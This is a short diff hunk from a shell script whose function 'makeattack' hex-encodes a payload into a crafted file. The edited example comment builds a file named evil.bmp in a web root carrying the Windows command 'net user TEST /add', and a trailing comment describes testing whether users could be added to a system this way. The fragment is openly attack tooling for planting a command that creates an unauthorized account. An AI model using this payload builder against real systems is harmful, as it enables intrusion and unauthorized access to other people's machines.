@@ -43,7 +43,7 @@ makeattack() {
  tr -d " \n" | \
  sed -r 's/(.{2})/\\\x\1/g'`;
  echo -e $constructor$trailer > $2;
-} # Example use: makeattack "/c net user TEST /add"
+} # Example use: makeattack "/c net user TEST /add" /var/www/html/evil.bmp
 #
 # In addition, this is a test to see if users could be added to a system 
 # using the same techniques as described above. Using this string, 
